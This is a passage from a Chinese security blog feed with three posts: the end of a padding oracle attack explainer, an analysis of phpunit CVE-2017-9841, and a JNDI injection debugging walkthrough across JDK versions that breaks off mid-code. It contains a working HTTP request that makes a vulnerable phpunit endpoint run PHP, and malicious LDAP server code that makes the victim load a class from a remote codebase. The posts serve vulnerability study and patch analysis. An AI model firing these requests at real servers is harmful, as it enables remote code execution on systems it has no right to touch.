Attack的场景需要如下条件：</p><ol><li>攻击者知道服务端使用CBC模式的加密算法，且能获取到密文Ciphertext以及附带在密文前面的初始向量IV；</li><li>攻击者能向服务端提交数据触发解密操作，并能根据服务端返回的响应来判断是否能进行正常解密；</li></ol><h3 id="基本原理-1"><a href="#基本原理-1" class="headerlink" title="基本原理"></a>基本原理</h3><p>Padding Oracle Attack是根据CBC字节翻转攻击、Padding规则以及服务端解密后返回的不同状态来穷举中间值进而获取明文的攻击，是针对CBC链接模式的攻击，而不是针对某个加密算法的攻击。</p><p>CBC字节翻转攻击和Padding Oracle在前面已经说过了，这里重点说下是如何根据服务端解密后返回的不同状态来穷举中间值进而获取明文的。</p><p>由Padding Oracle可知，如果输入的密文不合法（填充规则不对），类库则会抛出异常，这便是一种提示。通过CBC字节翻转攻击，攻击者可以不断地提供密文，让解密程序给出提示，不断修正，最终得到所需要的结果。关键就在于解密程序给出对于不同密文的解密结果有不同的提示。一般的，服务器对于接受的使用CBC模式加密敏感信息进行解密操作时，先是检测密文最后一组的填充值是否正确来确定能否正常解密（即检测是否符合PKCS #5/7），如果错误就直接返回错误，如果正确则进一步判断解密的内容是否正确，因此分如下三种情况：</p><ol><li>密文不能正常解密；</li><li>密文可正常解密但解密结果不对；</li><li>密文可正常解密且解密结果正确；</li></ol><p>这里第一种情况和第二三种的情况肯定是不一样的，很多服务器对于第一种情况都是返回500、对于第二三种情况则是返回200，这就是个有限的二元组，攻击者可以根据这个响应状态码来判断是否解密成功，给攻击者进行猜解攻击的可能。更细节点，就是让攻击者可以通过服务端解密后的响应状态来判断填充的字节是否正确来进行穷举攻击，攻击者只需要根据第一和第二种情况返回的不同状态就能实现穷举攻击，而无需服务端能解密得到正确的结果。</p><p>由前面CBC模式的解密流程知道，第n组密文解密后的中间值与前一组的密文XOR便可得到明文（Plaintext[n] = IntermediaryValue[n] XOR Ciphertext[n-1]）。其中，密文解密部分是在服务器端进行的，我们无需考虑，因此关键在于得到正确的中间值。在Padding Oracle Attack中，攻击者可控的参数是IV和Ciphertext，通过对IV的穷举来请求服务器端对指定的Ciphertext进行解密，并对返回的结果进行判断，从而得到正确的中间值，进而通过XOR得到原始明文。</p><p>网上找的一个图如下，使用的是DES算法，明文填充了4位，如果最后一组密文解密后的结果（Intermediary Value）与前一组密文/初始向量（IV）异或得到的最后四位是0x04，那么服务器就会返回可以正常解密：</p><p><img src="/2020/09/17/浅析CBC字节翻转攻击与Padding-Oracle-Attack/6.png" alt=""></p><p>简单地说，就是利用PKCS规则来构造Padding、通过服务端解密后返回的不同状态来推出正确的中间值，再通过中间值与原密文XOR得到原明文，之后依次递归解出每一位的中间值和明文直至全部穷举成功。</p><h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p>攻击过程如下：</p><p>1、假设攻击者拥有密文且得知服务端是用CBC模式的DES算法进行加解密操作，然后把密文按照加密算法的要求分好组，再对倒数第二组密文进行构造；</p><p>2、先假设明文只填充了一字节，对倒数第二组密文的最后一字节从0x00到0xff逐个赋值后提交给服务器进行解密操作，直至服务器返回的响应状态码表示构造后的密文可以正常解密为止；</p><p>比如构造的倒数第二组密文（或IV）最后一字节为0x00时，在服务端解密后得到0x3D、这是无法正常解密的、会返回500响应状态码：</p><p><img src="/2020/09/17/浅析CBC字节翻转攻击与Padding-Oracle-Attack/7.png" alt=""></p><p>当构造的倒数第二组密文（或IV）最后一字节为0x66时，在服务端解密后得到0x01、这是正确的padding值，是能正常解密的，此时会返回200响应状态码：</p><p><img src="/2020/09/17/浅析CBC字节翻转攻击与Padding-Oracle-Attack/8.png" alt=""></p><p>3、利用XOR的可逆性，攻击者把前面构造的倒数第二组密文的最后一字节0x66和0x01进行XOR得到中间值Intermediary Value（后续简称M1）为0x67；</p><p>4、接着，假设明文填充了两字节，即明文最后两字节是0x02，再构造倒数第二组密文，把M1与0x02进行XOR得到填充两字节时密文的最后一位的值为0x65。此时，攻击者只需要对倒数第二位进行不断地赋值尝试（0x00-0xff），当服务器返回值表示可以正常解密时（如200响应状态码），就将此时的倒数第二位密文的取值与0x02进行XOR得到最后一组密文倒数第二字节对应的中间值即M2；</p><p>5、接着，再构造出倒数第三、四直至得到最后一组密文的中间值，把这个中间值与倒数第二组的原始密文进行XOR便可得到最后一组分组的明文；</p><p>6、舍弃掉最后一组密文，只提交第一组到倒数第二组密文，通过构造倒数第三组密文得到倒数第二组密文的明文，依次下去直至得到全部的明文；</p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>整个攻击过程相对来说是复杂了些，但是业界已经有工具来实现这个复杂过程的攻击利用：</p><p><a href="https://github.com/AonCyberLabs/PadBuster" target="_blank" rel="noopener">https://github.com/AonCyberLabs/PadBuster</a></p><p>在Kali中也是有该命令的，需要安装：<code>apt-get install padbuster</code></p><h3 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h3><p>PentesterLab中有个Padding Oracle靶机环境，整个攻击利用过程是借助padbuster来实现，比较简单。</p><p>具体做法可参考：<a href="http://www.mottoin.com/detail/861.html" target="_blank" rel="noopener">PentesterLab 的 Padding Oracle 漏洞靶机测试</a></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/#" target="_blank" rel="noopener">CBC Byte Flipping Attack—101 Approach</a></p><p><a href="https://www.freebuf.com/articles/es/151167.html" target="_blank" rel="noopener">Padding oracle attack详细解析</a></p><p><a href="https://www.smi1e.top/cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E5%92%8Cpadding-oracle/" target="_blank" rel="noopener">CBC字节翻转攻击和Padding Oracle</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Padding Oracle Attack" scheme="https://www.mi1k7ea.com/tags/Padding-Oracle-Attack/"/>
    
      <category term="CBC字节翻转攻击" scheme="https://www.mi1k7ea.com/tags/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>浅析phpunit之CVE-2017-9841</title>
    <link href="https://www.mi1k7ea.com/2020/09/15/%E6%B5%85%E6%9E%90phpunit%E4%B9%8BCVE-2017-9841/"/>
    <id>https://www.mi1k7ea.com/2020/09/15/浅析phpunit之CVE-2017-9841/</id>
    <published>2020-09-15T03:26:23.000Z</published>
    <updated>2020-09-15T08:14:22.797Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>最近hw遇到phpunit的攻击流量，之前没分析过，这里简单看下。</p><p>Composer 是 PHP 用来管理依赖（dependency）关系的工具。你可以在自己的项目中声明所依赖的外部工具库（libraries），Composer 会帮你安装这些依赖的库文件。Composer 默认情况下不是全局安装，而是基于指定的项目的某个目录中（例如 vendor）进行安装，并将所有文件放在该目录中。</p><p>PHPUnit是一个轻量级的PHP测试框架。使用Composer来安装PHPUnit扩展时，PHPUnit的所有文件都会存在于vendor目录中。</p><h2 id="0x02-CVE-2017-9841"><a href="#0x02-CVE-2017-9841" class="headerlink" title="0x02 CVE-2017-9841"></a>0x02 CVE-2017-9841</h2><h3 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h3><p>靶机环境参考Vulhub：<a href="https://vulhub.org/#/environments/phpunit/CVE-2017-9841/" target="_blank" rel="noopener">https://vulhub.org/#/environments/phpunit/CVE-2017-9841/</a></p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>phpunit漏洞版本如下：</p><ul><li>4.8.19-4.8.27</li><li>5.0.10-5.6.2</li></ul><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>如果通过Composer安装的phpunit扩展的版本是漏洞版本，且vendor目录放在外部能访问的Web目录中，就存在phpunit远程代码执行漏洞。</p><p>漏洞代码，phpunit/src/Util/PHP/eval-stdin.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">'?&gt;'</span> . file_get_contents(<span class="string">'php://input'</span>));</span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>直接往eval-stdin.php文件所在路径直接POST发送PHP代码即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">If-None-Match: &quot;903-591a03aa15600&quot;</span><br><span class="line">If-Modified-Since: Tue, 03 Sep 2019 06:30:48 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 18</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/09/15/浅析phpunit之CVE-2017-9841/1.png" alt=""></p><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>5.6.3版本的eval-stdin.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">'?&gt;'</span> . file_get_contents(<span class="string">'php://stdin'</span>));</span><br></pre></td></tr></table></figure><p>就是将<code>php://input</code>伪协议替换为<code>php://stdin</code>伪协议。</p><p>这样当然能修补漏洞了。但是听说<code>php://stdin</code>伪协议在某些PHP SAPI场景下还是有问题的，这个可自行探究。</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>不将vendor放在Web目录中。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>浅析高低版JDK下的JNDI注入及绕过</title>
    <link href="https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/"/>
    <id>https://www.mi1k7ea.com/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/</id>
    <published>2020-09-07T02:13:11.000Z</published>
    <updated>2020-09-15T01:37:37.907Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本篇主要是填前面的坑，是<a href="/2019/09/15/浅析JNDI注入/">《浅析JNDI注入》</a>的延续篇，主要调试分析高低版本JDK下JNDI注入的RMI和LDAP两个攻击向量的调用过程及其异同点，再复现调试网上公布的高版本JDK绕过方法。</p><h2 id="0x01-调试分析高低版JDK下的JNDI注入"><a href="#0x01-调试分析高低版JDK下的JNDI注入" class="headerlink" title="0x01 调试分析高低版JDK下的JNDI注入"></a>0x01 调试分析高低版JDK下的JNDI注入</h2><p>这里只对常用的RMI和LDAP两个攻击向量进行调试分析。</p><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><h4 id="低版本"><a href="#低版本" class="headerlink" title="低版本"></a>低版本</h4><p>以之前<a href="/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/#%E6%BC%8F%E6%B4%9E%E7%82%B91%E2%80%94%E2%80%94lookup%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5">lookup参数注入的Demo</a>来调试分析下，将RMI服务端的factoryLocation参数改为<code>http://127.0.0.1:8000/</code>，本地JDK为8u112。</p><p>直接在com.sun.jndi.rmi.registry.RegistryContext类的lookup()函数下打上断点，此时函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lookup:124, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">main:13, AClient</span><br></pre></td></tr></table></figure><p>其中从RMI注册表中lookup查询到服务端中目标类的Reference后返回一个ReferenceWrapper_Stub类实例，该类实例就是客户端的存根、用于实现和服务端进行交互，最后调用decodeObject()函数来解析：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/27.png" alt=""></p><p>跟进decodeObject()函数中，先判断入参ReferenceWrapper_Stub类实例是否是RemoteReference接口实现类实例，而ReferenceWrapper_Stub类正是实现RemoteReference接口类的，因此通过判断调用getReference()来获取到ReferenceWrapper_Stub类实例中的Reference即我们在恶意RMI注册中绑定的恶意Reference；再往下调用NamingManager.getObjectInstance()来获取远程服务端上的类实例：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/28.png" alt=""></p><p>跟进，调用到getObjectFactoryFromReference()函数，尝试从Reference中获取ObjectFactory：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/29.png" alt=""></p><p>跟进，通过codebase和factoryName来调用loadClass()函数来远程加载恶意类EvilClassFactory，最后直接通过newInstance()实例化该远程恶意类并返回：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/30.png" alt=""></p><p>注意，<strong>这里返回新建的远程类实例之前会先对实例转换为ObjectFactory类，因此，如果远程类不实现ObjectFactory接口类的话就会在此处报错，之前一些demo的恶意类没实现ObjectFactory类所出现的报错正出于此</strong>。</p><p>执行完newInstance()之后就触发漏洞了：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/31.png" alt=""></p><p>再往下就是判断新建的远程类实例是否为null，不为null则调用该远程类的getObjectInstance()函数并返回，否则直接返回Reference实例。从这里知道，<strong>其实恶意类的恶意代码除了能写在无参构造函数外，也可以写在重写的getObjectInstance()函数中来触发</strong>。</p><p>至此，整个调用过程调试完毕。</p><h4 id="高版本"><a href="#高版本" class="headerlink" title="高版本"></a>高版本</h4><p>在JDK 6u141、7u131、8u121之后，增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项。</p><p>这里更换8u251版本的JDK来继续调试。</p><p>直接运行会报如下错误，说该ObjectFactory是不可信的，除非设置com.sun.jndi.rmi.object.trustURLCodebase项的值为true：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*]Using lookup() to fetch object with rmi://127.0.0.1:1688/exp</span><br><span class="line">Exception in thread "main" javax.naming.ConfigurationException: The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.</span><br><span class="line">at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495)</span><br><span class="line">at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)</span><br><span class="line">at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)</span><br><span class="line">at javax.naming.InitialContext.lookup(InitialContext.java:417)</span><br><span class="line">at AClient.main(AClient.java:13)</span><br></pre></td></tr></table></figure><p>前面的调用过程是一样的，这里直接根据报错在com.sun.jndi.rmi.registry.RegistryContext类的decodeObject()函数打断点调试就好，此时函数调用栈：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">decodeObject:495, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:138, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">main:13, AClient</span><br></pre></td></tr></table></figure><p>看到，在调用NamingManager.getObjectInstance()函数获取Reference指定的远程类之前先进行com.sun.jndi.rmi.object.trustURLCodebase值的判断，该值默认为false因此直接抛出错误：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/1.png" alt=""></p><h4 id="修补点源码对比"><a href="#修补点源码对比" class="headerlink" title="修补点源码对比"></a>修补点源码对比</h4><p>对比下新旧版JDK的com.sun.jndi.rmi.registry.RegistryContext类的decodeObject()函数的代码就很清楚了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 低版本JDK</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">            <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">            var4.setRootCause(var7);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 高版本JDK</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">            Reference var8 = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">                var8 = (Reference)var3;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">                var8 = ((Referenceable)((Referenceable)var3)).getReference();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var8 != <span class="keyword">null</span> &amp;&amp; var8.getFactoryClassLocation() != <span class="keyword">null</span> &amp;&amp; !trustURLCodebase) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(<span class="string">"The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'."</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">            var4.setRootCause(var7);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>很明显，<strong>就只是在使用URLClassLoader加载器加载远程类之前加了个if语句检测com.sun.jndi.ldap.object.trustURLCodebase的值是否为true，而该设置项的值默认为false</strong>。</p><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><h4 id="低版本-1"><a href="#低版本-1" class="headerlink" title="低版本"></a>低版本</h4><p>以之前<a href="/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/#LDAP-Reference%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7">LDAP+Reference的Demo</a>来调试分析下，本地JDK为8u181。</p><p>先看下，我们在恶意LDAP服务端的sendResult()函数中设置了如下属性项：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">e.addAttribute(<span class="string">"javaCodeBase"</span>, cbstring);</span><br><span class="line">e.addAttribute(<span class="string">"objectClass"</span>, <span class="string">"javaNamingReference"</span>);</span><br><span class="line">e.addAttribute(<span class="string">"javaFactory"</span>, <span class="keyword">this</span>.codebase.getRef());</span><br></pre></td></tr></table></figure><p>直接在com.sun.jndi.ldap.LdapCtx类的c_lookup()函数上打上断点，此时函数调用栈如下，看到就是不同几个类的lookup()函数在逐次调用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c_lookup:1051, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:94, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">main:9, LdapClient</span><br></pre></td></tr></table></figure><p>往下调试看到，var4变量是BasicAttributes类实例、其值是我们在恶意LDAP服务端设置的属性值，因为设置了javaClassName属性值为”Exploit”，因此调用了decodeObject()函数来对var4进行对象解码操作：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/8.png" alt=""></p><p>跟进decodeObject()函数中，先调用getCodebases()函数获取到javaCodeBase项设置的URL地址<code>http://127.0.0.1:8000/</code>，接着两个判断是否存在javaSerializedData和javaRemoteLocation这两项的值，这里由于没设置就直接进入最后的else语句逻辑，最后由于var1不为null且var1值为前面设置的objectClass内容因此直接调用到decodeReference()函数来进一步解码Reference：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/9.png" alt=""></p><p>在decodeReference()函数中，根据设置的javaFactory、javaClassName、javaCodeBase等项来通过执行<code>Reference(&quot;EvilObject&quot;, null, &quot;http://127.0.0.1:8000/&quot;)</code>来新建一个Reference类实例，最后直接返回该Reference类实例：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/10.png" alt=""></p><p>decodeObject()函数执行完返回Reference类实例后，继续在com.sun.jndi.ldap.LdapCtx类的c_lookup()函数往下调试，看到最后是调用到了DirectoryManager.getObjectInstance()函数：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/20.png" alt=""></p><p>跟进去getObjectInstance()函数的调用，看到其中调用了getObjectFactoryFromReference()函数来从Reference中获取ObjectFactory后再调用getObjectInstance()函数来获取实际的对象实例：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/21.png" alt=""></p><p>跟进getObjectFactoryFromReference()函数中，其中通过factoryName和codebase来调用loadClass()函数从<code>http://127.0.0.1:8000/EviObject</code>中远程加载类（在loadClass()函数中实际是通过FactoryURLClassLoader加载器来加载远程Factory URL类）：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/22.png" alt=""></p><p>获取到远程恶意类EvilObject后，直接调用newInstance()函数新建该恶意类实例：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/23.png" alt=""></p><p>而此时由于EvilObject类的恶意代码是写在无参构造函数中的，因此即使无法成功获取到Object实例也能直接触发漏洞：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/24.png" alt=""></p><p><strong>注意：上述报错的原因在于恶意远程类没有实现ObjectFactory接口类，具体原因后面会调试分析到。当然，实现了该接口就不会出现这种报错了。</strong></p><h4 id="高版本-1"><a href="#高版本-1" class="headerlink" title="高版本"></a>高版本</h4><p>JDK 6u211、7u201、8u191之后，增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项。</p><p>这里更换8u251版本的JDK来继续调试。</p><p>前面的函数调用过程和低版本是一样的，直接看下不同的地方，<strong>就是在getObjectFactoryFromReference()函数中调用loadClass()函数时返回了null</strong>，直接在com.sun.naming.internal.VersionHelper12类loadClass()函数上打断点调试，此时函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">loadClass:101, VersionHelper12 (com.sun.naming.internal)</span><br><span class="line">getObjectFactoryFromReference:158, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:189, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:1085, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:94, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">main:9, LdapClient</span><br></pre></td></tr></table></figure><p>看到这里添加了个if判断条件，检测com.sun.jndi.ldap.object.trustURLCodebase的值是否为true，是的话才能正常通过URLClassLoader来加载远程类，否则返回null：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/2.png" alt=""></p><p>看到常量trustURLCodebase定义处的源码（位于com.sun.naming.internal.VersionHelper12），可以看到该值是从系统设置找那个获取的，默认为FALSE：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 